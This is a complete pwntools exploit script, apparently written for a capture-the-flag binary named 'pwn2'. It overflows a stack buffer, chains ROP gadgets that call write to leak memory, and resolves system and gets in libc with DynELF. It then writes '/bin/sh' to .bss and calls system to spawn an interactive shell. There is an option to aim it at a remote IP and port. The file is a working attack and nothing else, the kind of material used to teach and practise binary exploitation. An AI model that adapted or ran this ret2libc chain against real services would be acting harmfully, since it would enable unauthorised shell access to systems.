from pwn import *

debug = True
if debug:
	io = process("./pwn2")
	elf = ELF("./pwn2")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	#change this line!!!!!!!!!!!!!!!!!!!!!!!
	io = remote("173.1.3.251",10001)
	elf = ELF("./pwn2")
	libc = ELF("./libc.so.6")

context.log_level = "debug"
#rdi,rsi,rdx	
write_plt = elf.plt["write"]
read_got = elf.got["read"]
write_got = elf.got["write"]
read_plt = elf.plt["read"]
main_addr = 0x000000000040059D
char_num = 0x80
pop_rdi = 0x0000000000400633
pp_rsi = 0x0000000000400631

def leak(address, length=8):
    payload_pad = char_num * "a" + "junkjunk"
    payload1 = payload_pad + p64(pop_rdi) + p64(1) + p64(pp_rsi) + p64(address) + p64(0) + p64(write_plt) + p64(main_addr)
    io.recvuntil("Hello, World\n")
    io.send(payload1)
    data = io.recv(length)   
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

def main():
    #1. leak system address
    #raw_input('#1. leak system address')
    #print libc.symbols["aBinSh"]
    d = DynELF(leak, elf=ELF('./pwn2'))
    system_addr = d.lookup('system', 'libc')
    log.success("system_addr=" + hex(system_addr))
    gets_addr = d.lookup('gets', 'libc')
    log.success("gets=" + hex(gets_addr))

    #2. execute system('/bin/sh')
    #raw_input('#2. system binsh')
    payload_pad = char_num * "a" + "a"*4
    #offset = 0xffc803d0 - 0xf7ee8dbc
    bss_addr = 0x0000000000601048
    binsh = "/bin/sh\x00"
    payload_pad = char_num * "a" + "junkjunk"
    payload1 = payload_pad + p64(pop_rdi) + p64(bss_addr) + p64(gets_addr) + p64(main_addr)
    io.recvuntil("Hello, World\n")
    io.send(payload1)
    io.send(binsh+"\n")
    payload1 = payload_pad + p64(pop_rdi) + p64(bss_addr) + p64(system_addr)
    io.send(payload1)
    #io.recvuntil("Hello, World\n")
    #io.send(binsh)
    io.interactive()

if __name__ == '__main__':
    main()

